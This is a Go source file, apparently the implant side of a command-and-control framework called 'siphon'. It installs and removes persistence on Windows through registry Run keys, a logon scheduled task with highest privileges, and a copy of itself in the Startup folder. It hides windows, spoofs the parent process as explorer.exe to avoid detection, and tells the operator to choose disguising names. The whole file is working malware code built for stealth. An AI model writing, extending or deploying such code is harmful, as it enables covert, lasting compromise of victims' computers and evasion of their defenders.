//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"

	"siphon/shared"
)

// executePersist installs persistence using the method specified in task.Args.
// Supported methods: registry, schtask, startup
// Optional second arg after | is the name to use (operator MUST specify a
// context-appropriate name for the target environment).
func executePersist(task *shared.Task) shared.TaskResult {
	parts := strings.SplitN(task.Args, "|", 2)
	method := strings.TrimSpace(parts[0])
	name := ""
	if len(parts) == 2 {
		name = strings.TrimSpace(parts[1])
	}
	if name == "" {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: "name required: persist <method>|<name>"}
	}

	exePath, err := os.Executable()
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("cannot resolve exe path: %v", err)}
	}

	switch method {
	case "registry":
		return persistRegistry(task.ID, exePath, name)
	case "schtask":
		return persistScheduledTask(task.ID, exePath, name)
	case "startup":
		return persistStartupFolder(task.ID, exePath, name)
	default:
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: "unknown method: " + method + " (use: registry, schtask, startup)"}
	}
}

// persistRegistry adds HKCU\Software\Microsoft\Windows\CurrentVersion\Run entry
// via direct registry API — no child process spawned.
func persistRegistry(taskID, exePath, name string) shared.TaskResult {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err != nil {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: fmt.Sprintf("open key: %v", err)}
	}
	defer key.Close()

	if err := key.SetStringValue(name, exePath); err != nil {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: fmt.Sprintf("set value: %v", err)}
	}
	return shared.TaskResult{TaskID: taskID, Success: true, Output: fmt.Sprintf("registry run key added: %s → %s", name, exePath)}
}

// persistScheduledTask creates a scheduled task via schtasks.exe with PPID
// spoofing under explorer.exe to reduce process-tree suspicion.
func persistScheduledTask(taskID, exePath, name string) shared.TaskResult {
	cmd := exec.Command("schtasks", "/create",
		"/tn", name, "/tr", exePath,
		"/sc", "ONLOGON", "/rl", "HIGHEST", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: createNoWindow,
		HideWindow:    true,
	}
	if parent := spoofParent(); parent != 0 {
		cmd.SysProcAttr.ParentProcess = parent
		defer syscall.CloseHandle(parent)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: string(out) + "\n" + err.Error()}
	}
	return shared.TaskResult{TaskID: taskID, Success: true, Output: fmt.Sprintf("scheduled task created: %s", name)}
}

// persistStartupFolder copies the binary to the user's Startup folder.
// Pure file I/O — no child process spawned.
func persistStartupFolder(taskID, exePath, name string) shared.TaskResult {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: "APPDATA not set"}
	}
	startupDir := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if err := os.MkdirAll(startupDir, 0700); err != nil {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: fmt.Sprintf("mkdir startup: %v", err)}
	}
	destPath := filepath.Join(startupDir, name+".exe")

	src, err := os.ReadFile(exePath)
	if err != nil {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: fmt.Sprintf("read self: %v", err)}
	}
	if err := os.WriteFile(destPath, src, 0600); err != nil {
		return shared.TaskResult{TaskID: taskID, Success: false, Output: fmt.Sprintf("write startup: %v", err)}
	}
	return shared.TaskResult{TaskID: taskID, Success: true, Output: fmt.Sprintf("copied to startup folder: %s", destPath)}
}

// executeUnpersist removes persistence installed by executePersist.
func executeUnpersist(task *shared.Task) shared.TaskResult {
	parts := strings.SplitN(task.Args, "|", 2)
	method := strings.TrimSpace(parts[0])
	name := ""
	if len(parts) == 2 {
		name = strings.TrimSpace(parts[1])
	}
	if name == "" {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: "name required: unpersist <method>|<name>"}
	}

	switch method {
	case "registry":
		key, err := registry.OpenKey(registry.CURRENT_USER,
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.SET_VALUE)
		if err != nil {
			return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("open key: %v", err)}
		}
		defer key.Close()
		if err := key.DeleteValue(name); err != nil {
			return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("delete value: %v", err)}
		}
		return shared.TaskResult{TaskID: task.ID, Success: true, Output: "registry key removed: " + name}

	case "schtask":
		cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: createNoWindow,
			HideWindow:    true,
		}
		if parent := spoofParent(); parent != 0 {
			cmd.SysProcAttr.ParentProcess = parent
			defer syscall.CloseHandle(parent)
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			return shared.TaskResult{TaskID: task.ID, Success: false, Output: string(out) + "\n" + err.Error()}
		}
		return shared.TaskResult{TaskID: task.ID, Success: true, Output: "scheduled task removed: " + name}

	case "startup":
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			return shared.TaskResult{TaskID: task.ID, Success: false, Output: "APPDATA not set"}
		}
		destPath := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", name+".exe")
		if err := os.Remove(destPath); err != nil {
			return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("remove: %v", err)}
		}
		return shared.TaskResult{TaskID: task.ID, Success: true, Output: "removed from startup: " + destPath}

	default:
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: "unknown method: " + method}
	}
}
